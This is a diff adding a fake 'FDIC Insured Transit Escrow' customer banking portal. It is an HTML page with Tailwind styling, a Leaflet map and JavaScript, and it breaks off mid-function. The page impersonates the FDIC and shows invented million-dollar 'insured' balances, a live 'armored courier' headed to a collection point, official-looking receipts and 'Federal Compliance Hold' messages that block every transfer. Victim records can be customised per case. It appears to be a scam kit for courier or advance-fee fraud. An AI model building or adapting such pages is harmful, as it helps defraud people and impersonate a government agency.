@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>FDIC Insured Transit Escrow | Official Customer Banking Portal</title>
+
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            fdic: {
+              navy: '#002868',
+              dark: '#001438',
+              midnight: '#000f2b',
+              light: '#0a3d91',
+              gold: '#c59b27',
+              accent: '#e6b738',
+              slate: '#f4f7fb'
+            }
+          },
+          fontFamily: {
+            sans: ['Inter', 'system-ui', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace']
+          }
+        }
+      }
+    }
+  </script>
+
+  <!-- Font Awesome Icons CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+
+  <!-- Leaflet CSS & JS (Free, open-source mapping with CartoDB Voyager / OpenStreetMap tiles - NO API key required, NO watermark) -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+
+  <style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body { font-family: 'Inter', sans-serif; }
+
+    /* Uber-style radar pulse halo for Vehicle Marker */
+    .vehicle-radar-marker {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .radar-pulse-ring {
+      position: absolute;
+      width: 58px;
+      height: 58px;
+      border-radius: 50%;
+      background: rgba(197, 155, 39, 0.25);
+      border: 2px solid rgba(197, 155, 39, 0.8);
+      animation: vehiclePulse 2s infinite cubic-bezier(0.215, 0.61, 0.355, 1);
+      pointer-events: none;
+    }
+    .radar-pulse-ring-outer {
+      position: absolute;
+      width: 78px;
+      height: 78px;
+      border-radius: 50%;
+      background: rgba(14, 165, 233, 0.15);
+      border: 1.5px dashed rgba(14, 165, 233, 0.6);
+      animation: vehiclePulseOuter 2.5s infinite linear;
+      pointer-events: none;
+    }
+    @keyframes vehiclePulse {
+      0% { transform: scale(0.5); opacity: 1; }
+      100% { transform: scale(1.3); opacity: 0; }
+    }
+    @keyframes vehiclePulseOuter {
+      0% { transform: rotate(0deg); opacity: 0.8; }
+      100% { transform: rotate(360deg); opacity: 0.2; }
+    }
+
+    .uber-car-icon-wrapper {
+      position: relative;
+      width: 44px;
+      height: 44px;
+      background: #001438;
+      border: 2.5px solid #c59b27;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.5);
+      z-index: 2;
+    }
+
+    .collection-point-pin-wrapper {
+      position: relative;
+      width: 44px;
+      height: 44px;
+      background: #047857;
+      border: 2.5px solid #ffffff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 14px rgba(4, 120, 87, 0.6);
+      z-index: 2;
+      animation: pinBounce 2s infinite;
+    }
+    @keyframes pinBounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-4px); }
+    }
+
+    .leaflet-container {
+      font-family: 'Inter', sans-serif !important;
+      background: #e5e7eb;
+    }
+    .custom-scroll::-webkit-scrollbar {
+      width: 5px;
+      height: 5px;
+    }
+    .custom-scroll::-webkit-scrollbar-thumb {
+      background-color: #cbd5e1;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body class="bg-slate-100 text-slate-900 min-h-screen flex flex-col antialiased selection:bg-amber-400 selection:text-slate-950">
+
+  <!-- TOP OFFICIAL HEADER -->
+  <header class="bg-fdic-dark text-white border-b border-blue-900 sticky top-0 z-40 shadow-lg">
+    <div class="max-w-5xl mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
+      
+      <!-- FDIC Brand Seal & Title -->
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 rounded-full bg-fdic-navy border-2 border-fdic-gold flex items-center justify-center shadow">
+          <i class="fa-solid fa-building-columns text-fdic-gold text-lg"></i>
+        </div>
+        <div>
+          <div class="flex items-center space-x-2">
+            <span class="font-black tracking-wider text-base uppercase text-white">FDIC</span>
+            <span class="text-[10px] font-bold px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 uppercase">
+              100% Insured
+            </span>
+          </div>
+          <p class="text-[11px] text-blue-200 font-medium">
+            Electronic Transit Escrow Banking Portal
+          </p>
+        </div>
+      </div>
+
+      <!-- User Badge & Sign Out -->
+      <div class="flex items-center space-x-3">
+        <div class="hidden sm:block text-right">
+          <div id="headerCustomerName" class="text-xs font-bold text-white">Eleanor Vance</div>
+          <div id="headerCaseBadge" class="text-[10px] font-mono text-amber-300 font-semibold">FDIC-C01-SEC</div>
+        </div>
+        <button
+          onclick="handleLogout()"
+          title="Sign Out"
+          class="py-1.5 px-3 bg-red-900/50 hover:bg-red-800 text-red-100 text-xs font-bold rounded-lg border border-red-700/50 transition flex items-center space-x-1.5"
+        >
+          <i class="fa-solid fa-arrow-right-from-bracket text-[11px]"></i>
+          <span class="hidden sm:inline">Sign Out</span>
+        </button>
+      </div>
+
+    </div>
+
+    <!-- TABS BAR -->
+    <div class="bg-fdic-midnight/90 border-t border-blue-950 px-4 sm:px-6">
+      <div class="max-w-5xl mx-auto flex items-center space-x-2 py-1.5">
+        <button
+          id="tabBtn-home"
+          onclick="switchCustomerTab('home')"
+          class="py-1.5 px-4 rounded-lg text-xs font-bold text-white bg-fdic-navy border border-blue-700 transition flex items-center space-x-1.5"
+        >
+          <i class="fa-solid fa-house text-amber-400"></i>
+          <span>Account & Live Transit</span>
+        </button>
+
+        <button
+          id="tabBtn-ledger"
+          onclick="switchCustomerTab('ledger')"
+          class="py-1.5 px-4 rounded-lg text-xs font-semibold text-blue-200 hover:text-white hover:bg-blue-900/50 transition flex items-center space-x-1.5"
+        >
+          <i class="fa-solid fa-receipt text-blue-300"></i>
+          <span>Settlement Ledger</span>
+        </button>
+
+        <button
+          id="tabBtn-profile"
+          onclick="switchCustomerTab('profile')"
+          class="py-1.5 px-4 rounded-lg text-xs font-semibold text-blue-200 hover:text-white hover:bg-blue-900/50 transition flex items-center space-x-1.5"
+        >
+          <i class="fa-solid fa-id-card text-emerald-300"></i>
+          <span>Profile & Verification</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN CONTAINER -->
+  <main class="flex-1 max-w-5xl w-full mx-auto p-4 sm:p-6 space-y-6">
+
+    <!-- ==================== TAB 1: HOME (TRANSIT & BALANCE) ==================== -->
+    <section id="tabContent-home" class="space-y-6">
+      
+      <!-- HERO BALANCE CARD -->
+      <div class="bg-gradient-to-br from-fdic-dark via-fdic-navy to-blue-950 text-white rounded-3xl p-6 sm:p-8 shadow-xl border border-blue-800/40 relative overflow-hidden">
+        <div class="absolute -right-10 -bottom-10 w-48 h-48 rounded-full bg-amber-500/10 blur-2xl pointer-events-none"></div>
+
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 relative z-10">
+          <div>
+            <div class="flex items-center space-x-2 mb-1">
+              <span class="text-xs font-semibold uppercase tracking-wider text-blue-200">Total Insured Escrow Balance</span>
+              <span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono text-[10px] font-bold border border-emerald-500/30">
+                100% Backed
+              </span>
+            </div>
+            <div id="customerBalanceDisplay" class="text-3xl sm:text-4xl lg:text-5xl font-black tracking-tight text-white font-mono">
+              $1,284,500.00
+            </div>
+            <p class="text-xs text-blue-200 mt-2 flex items-center space-x-1.5 font-medium">
+              <i class="fa-solid fa-shield-halved text-amber-400"></i>
+              <span>Secured by Federal Custody Resolution Escrow</span>
+            </p>
+          </div>
+
+          <div class="flex flex-col sm:items-end space-y-2">
+            <button
+              onclick="openSettlementReceiptModal()"
+              class="py-2.5 px-4 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs rounded-xl shadow-lg transition flex items-center space-x-2"
+            >
+              <i class="fa-solid fa-file-invoice-dollar"></i>
+              <span>Settlement Receipt</span>
+            </button>
+            <span class="text-[10px] text-blue-300 font-mono" id="depositDateBadge">Consignment Recorded: Today</span>
+          </div>
+        </div>
+
+        <!-- ACTION BUTTONS ROW (TRANSFER / BILL PAY / DEPOSIT) -->
+        <div class="grid grid-cols-3 gap-3 mt-6 pt-6 border-t border-blue-800/60 relative z-10">
+          <button
+            onclick="handleTransferClick()"
+            class="py-3 px-2 sm:px-4 bg-white/10 hover:bg-white/20 border border-white/15 rounded-2xl text-center transition flex flex-col items-center justify-center space-y-1.5 group"
+          >
+            <div class="w-9 h-9 rounded-full bg-blue-500/20 flex items-center justify-center text-blue-300 group-hover:scale-110 transition">
+              <i class="fa-solid fa-paper-plane text-xs sm:text-sm"></i>
+            </div>
+            <span class="text-xs font-bold text-white">Transfer</span>
+          </button>
+
+          <button
+            onclick="handleBillPayClick()"
+            class="py-3 px-2 sm:px-4 bg-white/10 hover:bg-white/20 border border-white/15 rounded-2xl text-center transition flex flex-col items-center justify-center space-y-1.5 group"
+          >
+            <div class="w-9 h-9 rounded-full bg-emerald-500/20 flex items-center justify-center text-emerald-300 group-hover:scale-110 transition">
+              <i class="fa-solid fa-file-invoice text-xs sm:text-sm"></i>
+            </div>
+            <span class="text-xs font-bold text-white">Bill Pay</span>
+          </button>
+
+          <button
+            onclick="handleDepositClick()"
+            class="py-3 px-2 sm:px-4 bg-white/10 hover:bg-white/20 border border-white/15 rounded-2xl text-center transition flex flex-col items-center justify-center space-y-1.5 group"
+          >
+            <div class="w-9 h-9 rounded-full bg-purple-500/20 flex items-center justify-center text-purple-300 group-hover:scale-110 transition">
+              <i class="fa-solid fa-circle-plus text-xs sm:text-sm"></i>
+            </div>
+            <span class="text-xs font-bold text-white">Deposit</span>
+          </button>
+        </div>
+
+      </div>
+
+      <!-- ARMORED TRANSIT DISPATCH & MAP SECTION -->
+      <div class="bg-white rounded-3xl border border-slate-200 shadow-sm overflow-hidden space-y-0">
+        
+        <!-- Transit Status Header Banner -->
+        <div class="p-4 sm:p-5 bg-slate-900 text-white flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+          <div class="flex items-center space-x-3">
+            <div class="w-10 h-10 rounded-2xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400">
+              <i class="fa-solid fa-truck-shield text-lg"></i>
+            </div>
+            <div>
+              <div class="flex items-center space-x-2">
+                <h2 class="text-sm sm:text-base font-extrabold text-white">Armored Consignment Transit In-Progress</h2>
+                <span class="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 font-mono text-[10px] font-bold border border-emerald-500/40 flex items-center space-x-1">
+                  <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                  <span>LIVE ESCORT</span>
+                </span>
+              </div>
+              <p class="text-xs text-slate-400 mt-0.5">Real-time street position and confirmed collection point</p>
+            </div>
+          </div>
+
+          <div class="flex items-center space-x-3">
+            <div class="bg-amber-500/20 border border-amber-500/40 px-3 py-1.5 rounded-xl text-right">
+              <div class="text-[10px] uppercase font-bold text-amber-300">Estimated Arrival</div>
+              <div id="customerEtaDisplay" class="text-sm font-black text-amber-400 font-mono">12 mins</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 100% Free Leaflet Map Canvas (CartoDB Voyager / OpenStreetMap - NO API key watermark) -->
+        <div id="customerMap" class="w-full h-[360px] sm:h-[420px] bg-slate-200 relative">
+          <!-- Leaflet Map renders here -->
+        </div>
+
+        <!-- LOCATION ADDRESSES & COURIER DETAILS PANEL -->
+        <div class="p-5 sm:p-6 bg-slate-50 border-t border-slate-200 grid grid-cols-1 md:grid-cols-2 gap-5">
+          
+          <!-- UBER / COURIER CURRENT STREET ADDRESS -->
+          <div class="p-4 bg-white rounded-2xl border border-blue-200 shadow-sm space-y-2">
+            <div class="flex items-center justify-between text-xs">
+              <span class="font-bold text-fdic-navy uppercase flex items-center space-x-1.5">
+                <i class="fa-solid fa-car text-amber-600"></i>
+                <span>Courier Current Location</span>
+              </span>
+              <span class="px-2 py-0.5 rounded bg-blue-50 text-blue-700 font-mono font-bold text-[10px] border border-blue-200">
+                In-Transit
+              </span>
+            </div>
+            <div id="displayUberAddress" class="text-xs font-semibold text-slate-800 leading-relaxed">
+              1401 Constitution Ave NW, Washington, DC 20230
+            </div>
+            <div class="text-[11px] text-slate-500 flex items-center space-x-1 pt-1 border-t border-slate-100">
+              <i class="fa-solid fa-id-badge text-slate-400"></i>
+              <span id="displayDriverDetails">Agent Marcus Vance • Armored Ford Transit</span>
+            </div>
+          </div>
+
+          <!-- CONFIRMED COLLECTION POINT (Editable Label & Full Street Address) -->
+          <div class="p-4 bg-white rounded-2xl border border-emerald-200 shadow-sm space-y-2">
+            <div class="flex items-center justify-between text-xs">
+              <span id="displayDestLabelTitle" class="font-bold text-emerald-900 uppercase flex items-center space-x-1.5">
+                <i class="fa-solid fa-location-dot text-emerald-600"></i>
+                <span>Confirmed Collection Point</span>
+              </span>
+              <span class="px-2 py-0.5 rounded bg-emerald-50 text-emerald-700 font-mono font-bold text-[10px] border border-emerald-200">
+                Verified
+              </span>
+            </div>
+            <div id="displayDestAddress" class="text-xs font-semibold text-slate-800 leading-relaxed">
+              1600 Pennsylvania Ave NW, Washington, DC 20500
+            </div>
+            <div class="text-[11px] text-slate-500 flex items-center space-x-1 pt-1 border-t border-slate-100">
+              <i class="fa-solid fa-circle-check text-emerald-600"></i>
+              <span>Authorized Physical Handover Destination</span>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+    </section>
+
+    <!-- ==================== TAB 2: SETTLEMENT LEDGER ==================== -->
+    <section id="tabContent-ledger" class="hidden space-y-6">
+      <div class="bg-white rounded-3xl border border-slate-200 shadow-sm p-6 space-y-4">
+        <div class="flex items-center justify-between border-b border-slate-100 pb-4">
+          <div>
+            <h2 class="text-base font-extrabold text-slate-900">FDIC Consignment & Settlement Ledger</h2>
+            <p class="text-xs text-slate-500">Official audited transaction history and custodial records</p>
+          </div>
+          <button onclick="openSettlementReceiptModal()" class="py-1.5 px-3 bg-fdic-navy text-white text-xs font-bold rounded-lg shadow">
+            View Receipt
+          </button>
+        </div>
+
+        <div class="divide-y divide-slate-100">
+          <div class="py-4 flex items-center justify-between hover:bg-slate-50 px-2 rounded-xl transition">
+            <div class="flex items-center space-x-3">
+              <div class="w-10 h-10 rounded-full bg-emerald-100 text-emerald-700 flex items-center justify-center font-bold text-sm">
+                <i class="fa-solid fa-vault"></i>
+              </div>
+              <div>
+                <div class="text-xs font-bold text-slate-900">FDIC Settled Consignment Escrow</div>
+                <div class="text-[11px] text-slate-400 font-mono">Trace: #FDIC-SETTLE-8842-X</div>
+                <div class="text-[10px] text-emerald-600 font-semibold mt-0.5">Cleared & Insured by Full Faith of US Government</div>
+              </div>
+            </div>
+            <div class="text-right">
+              <div id="ledgerAmountDisplay" class="text-sm font-mono font-bold text-emerald-700">+$1,284,500.00</div>
+              <div class="text-[10px] text-slate-400" id="ledgerDateDisplay">Today, 08:30:15 AM EST</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== TAB 3: PROFILE & VERIFICATION ==================== -->
+    <section id="tabContent-profile" class="hidden space-y-6">
+      <div class="bg-white rounded-3xl border border-slate-200 shadow-sm p-6 space-y-6">
+        <div class="flex items-center space-x-4 border-b border-slate-100 pb-5">
+          <div class="w-16 h-16 rounded-2xl bg-fdic-dark text-fdic-gold border-2 border-fdic-gold flex items-center justify-center text-2xl font-black shadow">
+            <i class="fa-solid fa-user-shield"></i>
+          </div>
+          <div>
+            <h2 id="profileFullName" class="text-lg font-extrabold text-slate-900">Eleanor Vance</h2>
+            <div class="flex items-center space-x-2 mt-1">
+              <span id="profileCaseNumber" class="text-xs font-mono font-bold text-fdic-navy bg-blue-50 px-2 py-0.5 rounded border border-blue-200">
+                FDIC-C01-SEC
+              </span>
+              <span class="text-xs font-bold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">
+                Verified Depositor
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
+          <div class="p-3 bg-slate-50 rounded-xl border border-slate-200">
+            <span class="text-slate-500 font-bold uppercase text-[10px]">Registered Contact Phone</span>
+            <div id="profilePhone" class="font-bold text-slate-800 mt-0.5">+1 (555) 019-2834</div>
+          </div>
+          <div class="p-3 bg-slate-50 rounded-xl border border-slate-200">
+            <span class="text-slate-500 font-bold uppercase text-[10px]">Electronic Notification Email</span>
+            <div id="profileEmail" class="font-bold text-slate-800 mt-0.5">eleanor.vance@fdicinsured.gov</div>
+          </div>
+          <div class="p-3 bg-slate-50 rounded-xl border border-slate-200 sm:col-span-2">
+            <span class="text-slate-500 font-bold uppercase text-[10px]">Confirmed Collection Point Physical Address</span>
+            <div id="profileCollectionPoint" class="font-bold text-slate-800 mt-0.5">1600 Pennsylvania Ave NW, Washington, DC 20500</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ==================== MODAL: OFFICIAL SETTLEMENT RECEIPT ==================== -->
+  <div id="receiptModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4 z-50">
+    <div class="bg-white rounded-3xl max-w-md w-full p-6 sm:p-7 text-slate-900 text-xs space-y-4 shadow-2xl border-4 border-fdic-gold/40 relative">
+      
+      <!-- Top Federal Receipt Header -->
+      <div class="text-center space-y-1.5 pb-4 border-b-2 border-dashed border-slate-300">
+        <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-fdic-dark text-fdic-gold border-2 border-fdic-gold mb-1">
+          <i class="fa-solid fa-building-columns text-xl"></i>
+        </div>
+        <h3 class="font-black text-sm uppercase tracking-wider text-fdic-navy">Federal Deposit Insurance Corp</h3>
+        <p class="text-[10px] uppercase font-bold text-slate-500">Official Settlement Consignment Receipt</p>
+      </div>
+
+      <!-- Receipt Fields -->
+      <div class="space-y-2.5 font-mono text-xs">
+        <div class="flex justify-between">
+          <span class="text-slate-500 font-sans">Case Identification:</span>
+          <span id="rcptCaseNumber" class="font-bold text-fdic-navy">FDIC-C01-SEC</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500 font-sans">Primary Beneficiary:</span>
+          <span id="rcptCustomerName" class="font-bold text-slate-800">Eleanor Vance</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500 font-sans">Settled Escrow Amount:</span>
+          <span id="rcptBalance" class="font-bold text-emerald-700 text-sm">$1,284,500.00 USD</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500 font-sans">Transit Escort Agent:</span>
+          <span id="rcptDriver" class="font-bold text-slate-800">Agent Marcus Vance</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500 font-sans">Collection Point:</span>
+          <span id="rcptDest" class="font-bold text-slate-800 text-[11px] text-right truncate max-w-[200px]">1600 Pennsylvania Ave NW</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500 font-sans">Custody Status:</span>
+          <span class="font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">100% FDIC Guaranteed</span>
+        </div>
+      </div>
+
+      <!-- Receipt Stamp -->
+      <div class="pt-4 border-t-2 border-dashed border-slate-300 text-center space-y-2">
+        <div class="inline-block border-2 border-emerald-700 text-emerald-700 px-3 py-1 rounded font-black font-mono text-xs uppercase tracking-widest rotate-[-2deg]">
+          ★ OFFICIAL GOVERNMENT SETTLED ★
+        </div>
+        <p class="text-[10px] text-slate-400 font-sans">
+          This receipt verifies federal escrow assignment under 12 U.S. Code § 1821.
+        </p>
+      </div>
+
+      <button onclick="closeSettlementReceiptModal()" class="w-full py-2.5 bg-fdic-navy hover:bg-blue-900 text-white font-bold rounded-xl text-xs shadow transition mt-2">
+        Close Official Receipt
+      </button>
+
+    </div>
+  </div>
+
+  <!-- ==================== MODAL: FEDERAL COMPLIANCE ACTION ERROR ==================== -->
+  <div id="complianceModal" class="fixed inset-0 bg-slate-950/85 backdrop-blur-sm hidden items-center justify-center p-4 z-50">
+    <div class="bg-white rounded-2xl max-w-sm w-full p-6 text-slate-900 text-xs space-y-4 shadow-2xl border border-red-200">
+      <div class="flex items-center space-x-3">
+        <div class="w-12 h-12 rounded-full bg-red-100 text-red-600 flex items-center justify-center text-xl shrink-0">
+          <i class="fa-solid fa-lock"></i>
+        </div>
+        <div>
+          <h3 id="complianceModalTitle" class="font-black text-sm text-red-800">Action Restricted</h3>
+          <p class="text-[10px] uppercase font-bold text-slate-400 font-mono">Federal Compliance Hold #FE-4029</p>
+        </div>
+      </div>
+
+      <div class="p-3 bg-red-50 rounded-xl border border-red-100 text-red-900 text-xs leading-relaxed font-medium" id="complianceModalMessage">
+        <!-- Error text dynamically injected -->
+      </div>
+
+      <button onclick="closeComplianceModal()" class="w-full py-2.5 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl text-xs transition">
+        Acknowledge & Dismiss
+      </button>
+    </div>
+  </div>
+
+  <!-- JAVASCRIPT LOGIC -->
+  <script>
+    const INITIAL_CUSTOMERS = [
+      {
+        id: "c-001",
+        case_number: "FDIC-C01-SEC",
+        first_name: "Eleanor",
+        last_name: "Vance",
+        phone: "+1 (555) 019-2834",
+        email: "eleanor.vance@fdicinsured.gov",
+        uber_address: "1401 Constitution Ave NW",
+        uber_city: "Washington",
+        uber_state: "DC",
+        uber_zip: "20230",
+        destination_label: "Confirmed Collection Point",
+        destination_address: "1600 Pennsylvania Ave NW",
+        destination_city: "Washington",
+        destination_state: "DC",
+        destination_zip: "20500",
+        balance: 1284500.00,
+        status: "Active",
+        driver_lat: 38.8921,
+        driver_lon: -77.0315,
+        customer_lat: 38.8977,
+        customer_lon: -77.0365,
+        eta: "12 mins",
+        driver_name: "Agent Marcus Vance",
+        driver_car: "Armored Ford Transit 2024",
+        driver_plate: "FDIC-8842-US",
+        transfer_error_msg: "Transfer Restricted: Federal Escrow Compliance Hold #FE-4029. Funds are undergoing final consignment escort verification with your designated courier.",
+        billpay_error_msg: "Bill Pay Suspended: Account is currently in Transit Escrow Status. Third-party disbursements are locked until courier delivery is confirmed.",
+        deposit_error_msg: "Deposit Verification Locked: Inbound ACH and mobile check capture are temporarily paused pending physical handover authorization.",
+        deposit_date: "Today, 08:30:15 AM EST",
+        password: "password123",
+        updated_at: new Date().toISOString()
+      },
+      {
+        id: "c-002",
+        case_number: "FDIC-C02-SEC",
+        first_name: "Jonathan",
+        last_name: "Hayes",
+        phone: "+1 (555) 014-9823",
+        email: "j.hayes@fdicinsured.gov",
+        uber_address: "11 W 53rd St",
+        uber_city: "New York",
+        uber_state: "NY",
+        uber_zip: "10019",
+        destination_label: "Confirmed Collection Point",
+        destination_address: "350 5th Ave",
+        destination_city: "New York",
+        destination_state: "NY",
+        destination_zip: "10118",
+        balance: 642000.00,
+        status: "Active",
+        driver_lat: 40.7614,
+        driver_lon: -73.9776,
+        customer_lat: 40.7484,
+        customer_lon: -73.9857,
+        eta: "8 mins",
+        driver_name: "Agent Sarah Sterling",
+        driver_car: "Armored Chevrolet Suburban",
+        driver_plate: "NY-FDIC-104",
+        transfer_error_msg: "Transfer Restricted: Federal Resolution Code 12-B. Transit courier handover is underway.",
+        billpay_error_msg: "Bill Pay Service Paused: Clearance protocol in progress.",
+        deposit_error_msg: "Deposit Locked: Third-party ACH transfers disabled during active escort.",
+        deposit_date: "Today, 09:12:04 AM EST",
+        password: "password123",
+        updated_at: new Date().toISOString()
+      }
+    ];
+
+    let currentCustomer = null;
+    let customerMapInstance = null;
+    let customerVehicleMarker = null;
+    let customerDestinationMarker = null;
+
+    function initCustomerPortal() {
+      // 1. Get customer ID from URL search params or localStorage
+      const urlParams = new URLSearchParams(window.location.search);
+      const customerId = urlParams.get('customer');
+
+      let customers = [];
+      try {
+        const stored = localStorage.getItem('fdic_customers_data');
+        customers = stored ? JSON.parse(stored) : INITIAL_CUSTOMERS;
+      } catch (e) {
+        customers = INITIAL_CUSTOMERS;
+      }
+
+      if (customerId) {
+        currentCustomer = customers.find(c => c.id === customerId);
+      }
+      
+      if (!currentCustomer) {
+        try {
+          const activeStored = localStorage.getItem('fdic_active_customer');
+          if (activeStored) currentCustomer = JSON.parse(activeStored);
+        } catch (e) {}
+      }
+
+      if (!currentCustomer) {
+        currentCustomer = customers[0] || INITIAL_CUSTOMERS[0];
+      }
+
+      renderCustomerData();
+      initCustomerMap();
+    }
+
+    function renderCustomerData() {
+      if (!currentCustomer) return;
+
+      const bal = parseFloat(currentCustomer.balance) || 0;
+      const formattedBal = `$${bal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+
+      // Header
+      document.getElementById('headerCustomerName').innerText = `${currentCustomer.first_name} ${currentCustomer.last_name}`;
+      document.getElementById('headerCaseBadge').innerText = currentCustomer.case_number;
+
+      // Balance
+      document.getElementById('customerBalanceDisplay').innerText = formattedBal;
+      document.getElementById('depositDateBadge').innerText = `Consignment: ${currentCustomer.deposit_date || 'Today'}`;
+
+      // Transit ETA
+      document.getElementById('customerEtaDisplay').innerText = currentCustomer.eta || '12 mins';
+
+      // Addresses
+      const uberFull = `${currentCustomer.uber_address || '1401 Constitution Ave NW'}, ${currentCustomer.uber_city || 'Washington'}, ${currentCustomer.uber_state || 'DC'} ${currentCustomer.uber_zip || '20230'}`;
+      const destLabel = currentCustomer.destination_label || 'Confirmed Collection Point';
+      const destFull = `${currentCustomer.destination_address || '1600 Pennsylvania Ave NW'}, ${currentCustomer.destination_city || 'Washington'}, ${currentCustomer.destination_state || 'DC'} ${currentCustomer.destination_zip || '20500'}`;
+
+      document.getElementById('displayUberAddress').innerText = uberFull;
+      document.getElementById('displayDriverDetails').innerText = `${currentCustomer.driver_name || 'Agent Courier'} • ${currentCustomer.driver_car || 'Armored Escort'}`;
+      
+      document.getElementById('displayDestLabelTitle').innerHTML = `<i class="fa-solid fa-location-dot text-emerald-600 mr-1.5"></i> <span>${destLabel}</span>`;
+      document.getElementById('displayDestAddress').innerText = destFull;
+
+      // Ledger Tab
+      document.getElementById('ledgerAmountDisplay').innerText = `+${formattedBal}`;
+      document.getElementById('ledgerDateDisplay').innerText = currentCustomer.deposit_date || 'Today, 08:30:15 AM EST';
+
+      // Profile Tab
+      document.getElementById('profileFullName').innerText = `${currentCustomer.first_name} ${currentCustomer.last_name}`;
+      document.getElementById('profileCaseNumber').innerText = currentCustomer.case_number;
+      document.getElementById('profilePhone').innerText = currentCustomer.phone;
+      document.getElementById('profileEmail').innerText = currentCustomer.email;
+      document.getElementById('profileCollectionPoint').innerText = destFull;
+
+      // Settlement Receipt Data
+      document.getElementById('rcptCaseNumber').innerText = currentCustomer.case_number;
+      document.getElementById('rcptCustomerName').innerText = `${currentCustomer.first_name} ${currentCustomer.last_name}`;
+      document.getElementById('rcptBalance').innerText = `${formattedBal} USD`;
+      document.getElementById('rcptDriver').innerText = currentCustomer.driver_name || 'Agent Courier';
+      document.getElementById('rcptDest').innerText = currentCustomer.destination_address || '1600 Pennsylvania Ave NW';
+    }
+
+    /* 100% Free CartoDB Voyager / OpenStreetMap (No API key, No watermark) */
+    function initCustomerMap() {
+      if (customerMapInstance) return;
+
+      const mapContainer = document.getElementById('customerMap');
+      if (!mapContainer) return;
+
+      customerMapInstance = L.map('customerMap', {
+        zoomControl: true,
+        attributionControl: false
+      }).setView([38.8951, -77.0364], 14);
+
+      L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+        maxZoom: 19,
+        subdomains: 'abcd'
+      }).addTo(customerMapInstance);
+
+      updateCustomerMapPins();
+    }
+
+    function updateCustomerMapPins() {
+      if (!customerMapInstance || !currentCustomer) return;
+
+      const driverLat = currentCustomer.driver_lat || 38.8921;
+      const driverLon = currentCustomer.driver_lon || -77.0315;
+      const destLat = currentCustomer.customer_lat || 38.8977;
+      const destLon = currentCustomer.customer_lon || -77.0365;
+
+      // 1. VEHICLE MARKER (Top-down Uber radar pulse halo)
+      const vehicleHtml = `
+        <div class="vehicle-radar-marker">
+          <div class="radar-pulse-ring"></div>
+          <div class="radar-pulse-ring-outer"></div>
+          <div class="uber-car-icon-wrapper">
+            <i class="fa-solid fa-car text-fdic-gold text-lg"></i>
+          </div>
+        </div>
+      `;
+      const vehicleIcon = L.divIcon({
+        className: 'custom-vehicle-div',
+        html: vehicleHtml,
+        iconSize: [44, 44],
+        iconAnchor: [22, 22]
+      });
+
+      if (customerVehicleMarker) {
+        customerVehicleMarker.setLatLng([driverLat, driverLon]);
+      } else {
+        customerVehicleMarker = L.marker([driverLat, driverLon], { icon: vehicleIcon }).addTo(customerMapInstance);
+      }
+      customerVehicleMarker.bindPopup(`<b>Courier:</b> ${currentCustomer.driver_name || 'Agent Courier'}<br><b>ETA:</b> ${currentCustomer.eta || '12 mins'}`);
+
